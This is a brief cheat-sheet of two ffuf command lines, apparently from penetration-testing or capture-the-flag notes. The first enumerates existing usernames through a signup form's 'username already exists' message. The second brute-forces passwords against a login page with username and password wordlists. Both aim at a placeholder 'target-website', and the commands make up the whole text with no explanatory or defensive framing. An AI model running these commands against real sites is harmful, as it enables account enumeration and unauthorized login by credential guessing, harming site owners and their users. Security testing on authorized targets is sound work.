# Fuzz usernames in a POST request to a signup page, checking for a response indicating that the username already exists.
ffuf -w /path/to/your/username_list -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://target-website/signup -mr "username already exists"

# Brute Force Passwords on Users
ffuf -w username_list.txt:W1,/path/to/your/password_list:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://target-website/login -fc 200












